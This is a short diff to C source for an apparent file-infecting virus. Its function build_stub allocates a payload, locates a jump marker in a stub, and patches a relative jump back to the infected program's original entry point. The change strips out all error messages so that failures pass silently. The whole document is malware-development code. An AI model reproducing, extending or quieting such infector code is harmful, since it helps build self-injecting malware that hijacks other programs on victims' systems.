@@ -11,7 +11,6 @@ bool build_stub(t_famine *p, const unsigned char *stub, size_t stub_len)
     p->payload      = ft_calloc(1, p->payload_size);
     if(!p->payload)
     {
-        perror("Payload allocation failed.");
         return false;
     }
 
@@ -32,7 +31,6 @@ bool build_stub(t_famine *p, const unsigned char *stub, size_t stub_len)
     }
     if(!found)
     {
-        fprintf(stderr, "Jump marker not found in stub.\n");
         return false;
     }
 
@@ -40,7 +38,6 @@ bool build_stub(t_famine *p, const unsigned char *stub, size_t stub_len)
     int64_t jmp_delta   = (int64_t)p->entry - (int64_t)(p->payload_va + next_offset);
     if(jmp_delta < INT32_MIN || jmp_delta > INT32_MAX)
     {
-        fprintf(stderr, "Jump out of range.\n");
         return false;
     }
     *(int32_t *)(p->payload + disp_offset) = (int32_t)jmp_delta;
